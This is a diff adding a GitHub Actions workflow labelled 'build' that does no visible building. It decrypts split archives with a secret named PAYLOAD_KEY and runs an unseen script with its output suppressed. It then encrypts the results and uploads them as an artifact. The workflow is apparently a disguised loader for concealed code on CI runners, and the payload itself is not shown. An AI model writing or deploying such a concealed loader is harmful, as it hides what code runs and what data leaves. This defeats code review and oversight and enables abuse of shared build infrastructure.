@@ -1,0 +1,41 @@
+name: build
+
+on:
+  push:
+    branches: [main]
+
+concurrency:
+  group: build
+  cancel-in-progress: true
+
+permissions:
+  contents: read
+
+jobs:
+  run:
+    runs-on: macos-15
+    timeout-minutes: 170
+    steps:
+      - uses: actions/checkout@v4
+      - name: run
+        env:
+          K: ${{ secrets.PAYLOAD_KEY }}
+        run: |
+          set -e
+          mkdir w
+          cd w
+          cat ../p/a.part-* | openssl enc -d -aes-256-cbc -pbkdf2 -md sha256 -iter 100000 -pass env:K | tar xzf -
+          echo "1 ok"
+          cat ../p/b.part-* | openssl enc -d -aes-256-cbc -pbkdf2 -md sha256 -iter 100000 -pass env:K | tar xzf -
+          echo "2 ok"
+          bash .ci/run.sh > /dev/null 2>&1 || true
+          echo "3 done"
+          tar czf - ci-out | openssl enc -aes-256-cbc -pbkdf2 -md sha256 -iter 100000 -salt -pass env:K > ../out.bin
+          echo "4 packed"
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: out
+          path: out.bin
+          retention-days: 3
+          if-no-files-found: ignore
